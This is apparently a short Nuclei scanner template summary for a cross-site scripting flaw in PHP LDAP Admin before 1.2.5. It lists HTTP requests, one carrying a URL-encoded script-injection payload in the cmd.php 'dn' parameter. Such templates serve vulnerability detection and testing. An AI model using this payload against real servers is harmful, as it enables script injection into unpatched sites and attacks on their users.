# Nuclei Template: PHP LDAP Admin < 1.2.5 - Cross-Site Scripting
**Template ID:** phpldapadmin-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**Source:** Nuclei Template (`phpldapadmin-xss.yaml`)

## Vulnerability Information & PoC

## Description
PHP LDAP Admin is vulnerable to XSS.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}
GET {{BaseURL}}{{path}}/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1
GET {{BaseURL}}{{path}}/index.php?redirect=true&meth=ajax
```

## References
- https://twitter.com/GodfatherOrwa/status/1701392754251563477
